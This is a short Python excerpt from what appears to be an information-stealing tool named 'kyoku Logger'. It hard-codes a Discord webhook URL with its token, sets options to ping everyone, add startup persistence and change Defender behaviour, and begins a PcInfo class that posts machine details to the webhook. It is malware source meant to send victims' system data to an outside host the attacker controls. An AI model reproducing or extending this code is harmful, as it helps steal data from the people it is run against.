...
__WEBHOOK__ = "https://discord.com/api/webhooks/1083034585312538645/sD3O5SW7PrTKwqjAOdWZpccPZZ6vqVPkRahXABnIAV74zooWq7y0pzEnGtmquC9tzYuP"
__PING__ = True
__PINGTYPE__ = "evreyone"
__ERROR__ = False
__STARTUP__ = False
__DEFENDER__ = False
...
class PcInfo:
    ...
    def get_inf(self, webhook):
        webhook = SyncWebhook.from_url(webhook, session=requests.Session())
        embed = Embed(title="kyoku Logger", color=5639644)
